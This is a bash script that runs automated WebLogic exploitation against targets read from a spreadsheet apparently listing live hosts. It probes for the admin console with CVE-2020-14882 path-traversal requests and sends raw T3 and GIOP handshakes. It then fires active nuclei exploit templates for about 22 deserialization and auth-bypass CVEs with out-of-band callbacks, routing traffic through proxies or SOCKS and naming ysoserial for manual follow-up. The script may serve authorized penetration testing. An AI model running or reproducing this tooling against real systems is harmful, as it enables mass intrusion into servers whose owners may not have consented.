#!/usr/bin/env bash
set -euo pipefail

###############################################################################
# scan-weblogic.sh
#
# Phase 1: surface detection (HTTP console / T3 / IIOP) per target
# Phase 2: run nuclei templates matched to detected surfaces
# Phase 3: write results back to Excel
#
# Usage:
#   chmod +x scan-weblogic.sh
#   ./scan-weblogic.sh [--dry-run] [--rows 2-79] [--timeout 30] [--rate 5]
#
# Requires: nuclei, python3, openpyxl, nc (netcat)
###############################################################################

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXCEL="$SCRIPT_DIR/Weblogic-VN-live-final.xlsx"
CUSTOM_TPL="$SCRIPT_DIR/Nuclei template"
UPSTREAM_TPL="$HOME/nuclei-templates"
WORK_DIR="$SCRIPT_DIR/.scan-work"

ROW_START=2
ROW_END=79
TIMEOUT=30
RATE_LIMIT=5
DRY_RUN=false
PROXY=""
SOCKS=""
SOCKS_AUTH=""
# WebLogic T3/IIOP listen ports to probe when the URL carries no explicit
# WebLogic port (i.e. the URL is on a web port 80/443, typically reverse-proxied).
# T3/IIOP never run on 80/443; the default listen port is 7001 (7002 = SSL,
# which a plaintext probe cannot detect). Override with --t3-ports 7001,7005.
T3_PORTS="7001"
# WebLogic SSL listen ports probed for T3/IIOP over TLS via `ncat --ssl`.
# Detect-only: reported as T3-ssl/IIOP-ssl (the plaintext nuclei templates
# cannot deliver over TLS). Empty by default: a sample of this list's targets
# showed all reachable T3 listeners are plaintext (7001/8081) and the 443/80
# hosts are reverse-proxied web fronts whose backend T3 port is not exposed, so
# probing 7002 mostly just times out. Enable with --t3-ssl-ports 7002 when a
# host is suspected to expose T3 over SSL.
T3_SSL_PORTS=""
# Python interpreter used for the Excel read/write phases; must have openpyxl.
# Override if `python3` on PATH lacks it, e.g. PYTHON=/path/to/python3 ./scan...
PYTHON="${PYTHON:-python3}"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --dry-run)   DRY_RUN=true; shift ;;
    --rows)      IFS='-' read -r ROW_START ROW_END <<< "$2"; shift 2 ;;
    --timeout)   TIMEOUT="$2"; shift 2 ;;
    --rate)      RATE_LIMIT="$2"; shift 2 ;;
    --proxy)     PROXY="$2"; shift 2 ;;
    --socks)     SOCKS="$2"; shift 2 ;;
    --socks-auth) SOCKS_AUTH="$2"; shift 2 ;;
    --t3-ports)  T3_PORTS="$2"; shift 2 ;;
    --t3-ssl-ports) T3_SSL_PORTS="$2"; shift 2 ;;
    --excel)     EXCEL="$2"; shift 2 ;;
    *)           echo "Unknown option: $1"; exit 1 ;;
  esac
done

if [[ -n "$PROXY" ]]; then
  echo "[*] Proxy: $PROXY (all HTTP + nuclei traffic routed through proxy)"
fi

# `timeout` bounds each raw probe, but stock macOS has no `timeout` command.
# Use it (or gtimeout) when present; otherwise rely on nc/ncat's own -w idle
# timeout. On Linux `timeout` exists, so probes are hard-bounded there.
if command -v timeout &>/dev/null; then TO="timeout $TIMEOUT"
elif command -v gtimeout &>/dev/null; then TO="gtimeout $TIMEOUT"
else TO=""; fi

mkdir -p "$WORK_DIR"

if [[ -n "$SOCKS" ]]; then
  echo "[*] SOCKS5: $SOCKS (T3/IIOP raw TCP routed through SOCKS)"
  PROXYCHAINS_CONF="$WORK_DIR/proxychains.conf"
  SOCKS_HOST="${SOCKS%%:*}"
  SOCKS_PORT="${SOCKS##*:}"
  if [[ -n "$SOCKS_AUTH" ]]; then
    SOCKS_USER="${SOCKS_AUTH%%:*}"
    SOCKS_PASS="${SOCKS_AUTH#*:}"
    cat > "$PROXYCHAINS_CONF" <<PCEOF
strict_chain
proxy_dns
[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT $SOCKS_USER $SOCKS_PASS
PCEOF
  else
    cat > "$PROXYCHAINS_CONF" <<PCEOF
strict_chain
proxy_dns
[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT
PCEOF
  fi
fi

# ─── Template classification by DELIVERY protocol ────────────────────────────
#
# HTTP: sends HTTP requests (console path traversal, LFI, JNDI via console)
#       Surface needed: WebLogic Console exposed (/console returns 200/302)
#
# T3:   sends T3 handshake + serialized payload over T3 on same connection
#       Surface needed: T3 protocol open (HELO response)
#
# IIOP: sends GIOP LocateRequest + rebind_any/resolve_any (gadget over IIOP)
#       also probes T3 for version first, so needs T3 + IIOP both open

HTTP_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2021-2109-active-oast.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14882.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14883.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14750.yaml"
  "$UPSTREAM_TPL/http/cves/2022/CVE-2022-21371.yaml"
  "$UPSTREAM_TPL/http/cves/2021/CVE-2021-2135.yaml"
)

T3_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2020-14644-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14825-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2136-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2211-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2394-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-20931-active-oast.yaml"
)

# IIOP delivery — requires T3 (version probe) + IIOP (payload delivery)
IIOP_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2020-2551-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-2555-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-2883-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14645-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14756-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14841-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2023-21839-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2023-21931-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-21006-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-21182-active-oast.yaml"
)

# ─── Phase 0: extract targets from Excel ─────────────────────────────────────
TARGETS_FILE="$WORK_DIR/targets.txt"
"$PYTHON" - "$EXCEL" "$ROW_START" "$ROW_END" "$TARGETS_FILE" <<'PYEXTRACT'
import sys, openpyxl
excel, rs, re, out = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
wb = openpyxl.load_workbook(excel, read_only=True)
ws = wb.active
lines = []
for row in range(rs, re + 1):
    url = ws.cell(row, 1).value
    if url and str(url).strip():
        lines.append(f"{row}\t{str(url).strip()}")
wb.close()
with open(out, "w") as f:
    f.write("\n".join(lines) + "\n")
print(f"Extracted {len(lines)} targets (rows {rs}-{re})")
PYEXTRACT

TOTAL=$(wc -l < "$TARGETS_FILE" | tr -d ' ')
echo "[*] Targets: $TOTAL"

# ─── Phase 1: surface detection ──────────────────────────────────────────────
echo "[*] Phase 1: surface detection (HTTP console / T3 / IIOP)..."

SURFACE_DIR="$WORK_DIR/surfaces"
mkdir -p "$SURFACE_DIR"

scan_surface() {
  local row="$1" url="$2"
  local host port scheme
  scheme=$(echo "$url" | grep -oE '^https?')
  host=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')
  port=$(echo "$url" | sed -E 's|^https?://[^:/]*:?||;s|/.*||')
  if [[ -z "$port" ]]; then
    [[ "$scheme" == "https" ]] && port=443 || port=80
  fi

  local result_file="$SURFACE_DIR/row${row}.txt"
  local surfaces=""

  if $DRY_RUN; then
    echo "HTTP,T3,IIOP" > "$result_file"
    echo "  [row $row] $host:$port -> HTTP,T3,IIOP (dry-run)"
    return
  fi

  # ── HTTP probe: verify the WebLogic admin console is actually here ──
  # Status code alone is not enough: a reverse proxy/portal happily returns
  # 200 or 302 for unrelated content. So classify on code + Location + body:
  #   200 + WebLogic fingerprint in body        -> HTTP (console confirmed)
  #   3xx with Location pointing at console/login -> HTTP (redirect to login)
  #   401/403                                     -> HTTP-restricted
  #       console app is deployed but access-blocked (connection filter / WAF).
  #       The preauth CVEs (14882/14883/14750/21371/2135) are auth-bypass +
  #       path-traversal against internal handlers on a DIFFERENT path than
  #       /console/login, so they may still fire -> keep the HTTP surface so
  #       those templates run; nuclei's OAST confirms if the bypass works.
  #   404/other                                   -> not an HTTP surface
  local console_url="${url%/}/console/login/LoginForm.jsp"
  local curl_proxy=()
  [[ -n "$PROXY" ]] && curl_proxy=(-x "$PROXY")
  local out meta http_code redirect body
  out=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
    --connect-timeout 10 --max-time "$TIMEOUT" \
    -w '__META__%{http_code}\t%{redirect_url}' \
    "$console_url" 2>/dev/null || printf '__META__000\t')
  meta=${out##*__META__}            # "<code>\t<redirect_url>"
  body=${out%__META__*}             # response body (everything before meta)
  http_code=${meta%%$'\t'*}
  redirect=${meta#*$'\t'}

  local wls_fp='WebLogic|j_security_check|console/framework|LoginForm|con_context'
  case "$http_code" in
    200)
      if printf '%s' "$body" | grep -qiE "$wls_fp"; then
        surfaces="HTTP"
      fi
      ;;
    301|302|303|307|308)
      if printf '%s' "$redirect" | grep -qiE 'console|LoginForm|j_security_check'; then
        surfaces="HTTP"
      fi
      ;;
    401|403)
      surfaces="HTTP-restricted"
      ;;
  esac

  # ── HTTP fallback: CVE-2020-14882 path-traversal as a secondary signal ──
  # A WAF may hide /console/login with a fake 404 while the auth-bypass handler
  # on a different path stays reachable. Only runs when the primary probe did
  # NOT already find a console. This GET is benign (loads console.portal, no
  # command execution); a 200 with console markers means the bypass itself
  # fired (console present AND unauth-reachable). Tries single- then
  # double-encoded traversal; a 401/403 here means the console is deployed but
  # the path is blocked/patched.
  if ! echo "$surfaces" | grep -q "HTTP"; then
    local trav_markers='WebLogic|con_context|Change Center|console\.portal|consolejndi'
    local trav_url tout tcode tbody
    for trav_url in \
      "${url%/}/console/css/%2e%2e%2fconsole.portal" \
      "${url%/}/console/images/%252e%252e%252fconsole.portal"; do
      tout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
        --connect-timeout 10 --max-time "$TIMEOUT" \
        -w '__META__%{http_code}' \
        "$trav_url" 2>/dev/null || printf '__META__000')
      tcode=${tout##*__META__}
      tbody=${tout%__META__*}
      if [[ "$tcode" == "200" ]] && printf '%s' "$tbody" | grep -qiE "$trav_markers"; then
        surfaces="HTTP-bypass"       # auth-bypass handler reachable (likely vuln)
        break
      elif [[ "$tcode" == "401" || "$tcode" == "403" ]]; then
        surfaces="HTTP-restricted"   # console deployed but path blocked/patched
        # keep trying the other encoding in case one variant is filtered
      fi
    done
  fi

  # ── T3 / IIOP probe (raw TCP) ──
  # T3/IIOP never listen on web ports (80/443): the HTTP URL port is for HTTP
  # only. For T3/IIOP we probe the real WebLogic listen port -> the URL's
  # explicit port when it is non-web (e.g. :7001, :8081), otherwise the
  # --t3-ports candidates (default 7001). Probing :443 for T3 is meaningless
  # (TLS front of a reverse proxy) and would false-negative away an open 7001.
  # The nuclei T3/IIOP templates are pinned to this same port in Phase 2.
  local nc_cmd="nc -w 5"
  if [[ -n "$SOCKS" ]]; then
    nc_cmd="ncat -w 5 --proxy-type socks5 --proxy $SOCKS"
    [[ -n "$SOCKS_AUTH" ]] && nc_cmd="$nc_cmd --proxy-auth $SOCKS_AUTH"
  fi

  # SSL-wrapped variant (WebLogic SSL listen port, default 7002) via ncat --ssl.
  # Used only for surface detection: the nuclei T3/IIOP templates speak plaintext
  # (net.Open tcp), so an SSL-only surface is reported (T3-ssl/IIOP-ssl) but NOT
  # auto-exploited here — flag it for manual work (ysoserial t3s / corbaloc:iiops).
  local ssl_cmd=""
  if command -v ncat &>/dev/null; then
    ssl_cmd="ncat --ssl -w 5"
    if [[ -n "$SOCKS" ]]; then
      ssl_cmd="ncat --ssl -w 5 --proxy-type socks5 --proxy $SOCKS"
      [[ -n "$SOCKS_AUTH" ]] && ssl_cmd="$ssl_cmd --proxy-auth $SOCKS_AUTH"
    fi
  fi

  local url_port=""
  [[ "$url" =~ ^https?://[^/]+:([0-9]+) ]] && url_port="${BASH_REMATCH[1]}"
  local -a plain_ports ssl_ports
  if [[ -n "$url_port" && "$url_port" != "80" && "$url_port" != "443" ]]; then
    plain_ports=("$url_port"); ssl_ports=("$url_port")  # explicit port: try both
  else
    IFS=',' read -ra plain_ports <<< "$T3_PORTS"         # reverse-proxied: defaults
    IFS=',' read -ra ssl_ports   <<< "$T3_SSL_PORTS"
  fi

  # GIOP 1.2 LocateRequest for object key "NameService"; an open IIOP listener
  # replies with a GIOP LocateReply. A bare header elicits no reply (server
  # waits for the body) -> false negatives. Verified on WLS 12.2.1.4.
  local giop_probe='\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65'

  # Probe one port with a given connector command; sets t3_hit / iiop_hit.
  local wlport="" t3_open="" iiop_open="" t3_ssl="" iiop_ssl="" p t3_hit iiop_hit
  probe_port() {   # $1=port  $2=connector cmd
    local pp="$1" conn="$2"
    t3_hit=""; iiop_hit=""
    echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://x:${pp}\n\n" | \
      $TO $conn "$host" "$pp" 2>/dev/null | grep -qai "HELO" && t3_hit=1
    printf "$giop_probe" | \
      $TO $conn "$host" "$pp" 2>/dev/null | grep -qa "GIOP" && iiop_hit=1
    return 0
  }

  # 1) plaintext (templates can exploit these)
  for p in "${plain_ports[@]}"; do
    p="${p// /}"; [[ -z "$p" ]] && continue
    probe_port "$p" "$nc_cmd"
    [[ -n "$t3_hit" ]] && t3_open=1
    [[ -n "$iiop_hit" ]] && iiop_open=1
    if [[ -n "$t3_open$iiop_open" ]]; then wlport="$p"; break; fi
  done

  # 2) SSL — only if nothing plaintext found, ncat is available, and SSL ports
  #    are configured (--t3-ssl-ports; empty by default). Detect-only.
  if [[ -z "$t3_open$iiop_open" && -n "$ssl_cmd" && ${#ssl_ports[@]} -gt 0 ]]; then
    for p in "${ssl_ports[@]}"; do
      p="${p// /}"; [[ -z "$p" ]] && continue
      probe_port "$p" "$ssl_cmd"
      [[ -n "$t3_hit" ]] && t3_ssl=1
      [[ -n "$iiop_hit" ]] && iiop_ssl=1
      if [[ -n "$t3_ssl$iiop_ssl" ]]; then break; fi
    done
  fi

  [[ -n "$t3_open"   ]] && surfaces="${surfaces:+$surfaces,}T3"
  [[ -n "$iiop_open" ]] && surfaces="${surfaces:+$surfaces,}IIOP"
  [[ -n "$t3_ssl"    ]] && surfaces="${surfaces:+$surfaces,}T3-ssl"
  [[ -n "$iiop_ssl"  ]] && surfaces="${surfaces:+$surfaces,}IIOP-ssl"

  [[ -z "$surfaces" ]] && surfaces="NONE"

  echo "$surfaces" > "$result_file"
  # Pin the plaintext WebLogic port for Phase 2 templates (falls back to first).
  echo "${wlport:-${plain_ports[0]}}" > "$SURFACE_DIR/row${row}.wlport"
  echo "  [row $row] $host (http:$port wl:${wlport:-none}) -> $surfaces"
}

while IFS=$'\t' read -r row url <&3; do
  scan_surface "$row" "$url"
done 3< "$TARGETS_FILE"

# ─── Phase 2: nuclei CVE scan per surface ────────────────────────────────────
echo ""
echo "[*] Phase 2: nuclei CVE scan..."

RESULTS_DIR="$WORK_DIR/results"
mkdir -p "$RESULTS_DIR"

run_nuclei_for_target() {
  local row="$1" url="$2"
  local surface_file="$SURFACE_DIR/row${row}.txt"
  local surfaces
  surfaces=$(cat "$surface_file" 2>/dev/null || echo "NONE")

  # WebLogic listen port discovered in Phase 1 (for T3/IIOP templates), and the
  # bare host (T3/IIOP must target host:wlport, not the HTTP URL / :443).
  local wlport host_only
  wlport=$(cat "$SURFACE_DIR/row${row}.wlport" 2>/dev/null || echo 7001)
  host_only=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')

  local templates=()
  local result_file="$RESULTS_DIR/row${row}.json"

  if [[ "$surfaces" == "NONE" ]]; then
    echo "  [row $row] no attack surface detected, skipping"
    : > "$result_file"
    return
  fi

  # Exact comma-token match so "T3" does NOT also match the SSL token "T3-ssl"
  # (templates speak plaintext; SSL surfaces are report-only, handled in Phase 1).
  has_surface() { case ",$surfaces," in *",$1,"*) return 0 ;; *) return 1 ;; esac; }

  # HTTP templates: any console surface (HTTP / HTTP-restricted / HTTP-bypass)
  if echo "$surfaces" | grep -q "HTTP"; then
    for t in "${HTTP_TEMPLATES[@]}"; do
      [[ -f "$t" ]] && templates+=("-t" "$t")
    done
  fi

  # T3 templates: only plaintext T3 open
  if has_surface T3; then
    for t in "${T3_TEMPLATES[@]}"; do
      [[ -f "$t" ]] && templates+=("-t" "$t")
    done
  fi

  # IIOP templates: need plaintext T3 (version probe) + plaintext IIOP (delivery)
  if has_surface T3 && has_surface IIOP; then
    for t in "${IIOP_TEMPLATES[@]}"; do
      [[ -f "$t" ]] && templates+=("-t" "$t")
    done
  fi

  if [[ ${#templates[@]} -eq 0 ]]; then
    echo "  [row $row] no matching templates for surfaces: $surfaces"
    : > "$result_file"
    return
  fi

  local count=$(( ${#templates[@]} / 2 ))

  if $DRY_RUN; then
    echo "  [row $row] would run $count templates against $url (surfaces: $surfaces)"
    : > "$result_file"
    return
  fi

  echo "  [row $row] scanning $url ($count templates, surfaces: $surfaces)..."

  # Split templates: HTTP (through Burp proxy) vs T3/IIOP (through SOCKS via proxychains)
  local http_tpls=() raw_tpls=()
  local i=0
  while [[ $i -lt ${#templates[@]} ]]; do
    if [[ "${templates[$i]}" == "-t" ]]; then
      local tpl="${templates[$((i+1))]}"
      if echo "$tpl" | grep -qE "/http/|2021-2109"; then
        http_tpls+=("-t" "$tpl")
      else
        raw_tpls+=("-t" "$tpl")
      fi
      i=$((i+2))
    else
      i=$((i+1))
    fi
  done

  # HTTP templates through Burp proxy
  if [[ ${#http_tpls[@]} -gt 0 ]]; then
    local nuclei_proxy=()
    [[ -n "$PROXY" ]] && nuclei_proxy=(-proxy "$PROXY")
    nuclei -u "$url" \
      "${http_tpls[@]}" \
      "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
      -timeout "$TIMEOUT" \
      -rate-limit "$RATE_LIMIT" \
      -no-color -jsonl -silent \
      -o "$result_file" \
      </dev/null 2>/dev/null || true
  fi

  # T3/IIOP templates through SOCKS via proxychains4.
  # Target the real WebLogic listen port (host:wlport), NOT the HTTP URL/:443.
  if [[ ${#raw_tpls[@]} -gt 0 ]]; then
    local nuclei_wrap=""
    if [[ -n "$SOCKS" && -f "${PROXYCHAINS_CONF:-/dev/null}" ]] && command -v proxychains4 &>/dev/null; then
      nuclei_wrap="proxychains4 -q -f $PROXYCHAINS_CONF"
    fi

    # The templates pin `Port: "7001"` internally (they ignore the URL port).
    # If the detected port differs, run sed-patched copies so the payload hits
    # the right port instead of always 7001.
    local -a raw_run=("${raw_tpls[@]}")
    if [[ "$wlport" != "7001" ]]; then
      local tpl_dir="$WORK_DIR/tpl-$wlport"
      mkdir -p "$tpl_dir"
      raw_run=()
      local j=0
      while [[ $j -lt ${#raw_tpls[@]} ]]; do
        if [[ "${raw_tpls[$j]}" == "-t" ]]; then
          local src="${raw_tpls[$((j+1))]}" base dst
          base=$(basename "$src")
          dst="$tpl_dir/$base"
          [[ -f "$dst" ]] || sed 's/Port: "7001"/Port: "'"$wlport"'"/' "$src" > "$dst"
          raw_run+=("-t" "$dst")
          j=$((j+2))
        else
          j=$((j+1))
        fi
      done
    fi

    $nuclei_wrap nuclei -u "$host_only" \
      "${raw_run[@]}" \
      -timeout "$TIMEOUT" \
      -rate-limit "$RATE_LIMIT" \
      -no-color -jsonl -silent \
      >> "$result_file" \
      </dev/null 2>/dev/null || true
  fi

  local hits=0
  [[ -s "$result_file" ]] && hits=$(wc -l < "$result_file" | tr -d ' ')
  echo "  [row $row] -> $hits finding(s)"
}

while IFS=$'\t' read -r row url <&3; do
  run_nuclei_for_target "$row" "$url"
done 3< "$TARGETS_FILE"

# ─── Phase 3: write results back to Excel ─────────────────────────────────────
echo ""
echo "[*] Phase 3: writing results to Excel..."

"$PYTHON" - "$EXCEL" "$WORK_DIR" "$ROW_START" "$ROW_END" <<'PYWRITE'
import sys, os, json, openpyxl
from openpyxl.styles import Font, PatternFill

excel = sys.argv[1]
work_dir = sys.argv[2]
row_start = int(sys.argv[3])
row_end = int(sys.argv[4])

wb = openpyxl.load_workbook(excel)
ws = wb.active

note_col = 4
surface_col = note_col + 1
vuln_col = note_col + 2
detail_col = note_col + 3

ws.insert_cols(surface_col, 3)

header_font = Font(bold=True)
header_fill = PatternFill("solid", fgColor="D9E1F2")
for col, title in [(surface_col, "Attack Surface"),
                   (vuln_col, "Vulnerabilities"),
                   (detail_col, "Scan Detail")]:
    cell = ws.cell(1, col, title)
    cell.font = header_font
    cell.fill = header_fill

for row in range(row_start, row_end + 1):
    sf = os.path.join(work_dir, "surfaces", f"row{row}.txt")
    surfaces = ""
    if os.path.isfile(sf):
        surfaces = open(sf).read().strip()
    ws.cell(row, surface_col, surfaces)

    rf = os.path.join(work_dir, "results", f"row{row}.json")
    cves = []
    details = []
    if os.path.isfile(rf):
        for line in open(rf):
            line = line.strip()
            if not line:
                continue
            try:
                j = json.loads(line)
                tid = j.get("template-id", j.get("templateID", ""))
                sev = j.get("info", {}).get("severity", "")
                matched = j.get("matched-at", j.get("matched", ""))
                cves.append(tid)
                details.append(f"{tid} [{sev}] {matched}")
            except json.JSONDecodeError:
                details.append(line)

    seen = []
    for c in cves:
        if c not in seen:
            seen.append(c)

    ws.cell(row, vuln_col, ", ".join(seen) if seen else "")
    ws.cell(row, detail_col, "\n".join(details) if details else "")

    if seen:
        ws.cell(row, vuln_col).font = Font(color="CC0000", bold=True)

for col in [surface_col, vuln_col, detail_col]:
    max_len = 0
    for row in range(1, row_end + 1):
        v = ws.cell(row, col).value
        if v:
            max_len = max(max_len, min(len(str(v)), 60))
    ws.column_dimensions[openpyxl.utils.get_column_letter(col)].width = max_len + 2

wb.save(excel)
print(f"Results written to {excel}")
print(f"  Columns inserted: E (Attack Surface), F (Vulnerabilities), G (Scan Detail)")
PYWRITE

echo ""
echo "[done] Results in: $EXCEL"
echo "    Work dir (raw JSON): $WORK_DIR"
